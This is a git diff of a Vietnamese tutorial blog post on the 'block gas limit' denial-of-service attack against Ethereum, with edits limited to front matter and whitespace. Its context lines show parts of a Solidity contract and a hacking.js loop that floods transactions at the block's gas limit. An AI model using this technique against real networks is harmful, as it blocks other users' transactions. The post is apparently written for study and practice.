@@ -1,8 +1,6 @@
 ---
 title: Block gas limit attack
 date: 2021-07-27 10:20:30 +/-0700
-categories: [Blockchain, Security]
-tags: [blockchain, security, learning, practice, ethereum]     # TAG names should always be lowercase
 ---
 
 # Blockchain Attack: Block gas limit attack
@@ -79,7 +77,7 @@ Nhận được kết quả trả về:
 
 Đã thấy thông số `gasLimit` của block là `1890884448`
 
-Để thực hiện Block Gas Limit Attack, như đã được nhắc tới trong bài Smart Contract Best Practice, chúng ta thức hiện việc gửi transaction tới network với lượng gas sử dụng xấp xỉ gas limit của block để chặn các transaction khác được thực thi - đây gọi là DoS with Block gas limit. 
+Để thực hiện Block Gas Limit Attack, như đã được nhắc tới trong bài Smart Contract Best Practice, chúng ta thức hiện việc gửi transaction tới network với lượng gas sử dụng xấp xỉ gas limit của block để chặn các transaction khác được thực thi - đây gọi là DoS with Block gas limit.
 
 ## Set up Truffle
 Thực hiện việc gửi transaction với mức gas cao xấp xỉgas limit của block cách dễ nhất là sử dụng 1 custom smart contract thực hiện vòng lặp gửi token tới nhiều address trong 1 lời gọi hàm
@@ -114,20 +112,20 @@ truffle migrate
 
 ## Write Smart Contract
 Viết 1 smart contract thực hiện chuyển token cho nhiều địa chỉ khác nhau, và sẽ sử dụng hết `1890884448` gas của 1 block trong 1 transaction
- 
+
  Tạo smart contract để thực hiện việc tấn công
 ```sh
 cd contracts/
 vim Transfer.sol
 ```
 
-Code 1 contract đơn giản thực hiện việc chuyển token 
+Code 1 contract đơn giản thực hiện việc chuyển token
 ```solidity
 pragma solidity >=0.4.25 <0.7.0;
 
 contract Transfer {
     address payable private owner;
-        
+
     constructor() public {
         owner = msg.sender;
     }
@@ -155,7 +153,7 @@ truffle deploy
 ```
 
 Chuyển 1 lượng token vừa đủ tới smart contract để thực hiện hacking
-## Start Hacking 
+## Start Hacking
 Viết script thực hiện gọi hàm transfer của smart contract
 ```sh
 vim hacking.js
@@ -183,11 +181,11 @@ async function hack() {
     while(true) {
         const signedTx = await web3.eth.accounts.signTransaction(
             {
-                to: contract.options.address, 
+                to: contract.options.address,
                 data,
                 gas: gasLimit,
                 gasPrice: 0,
-                nonce, 
+                nonce,
                 chainId: networkId
             },
             privateKey
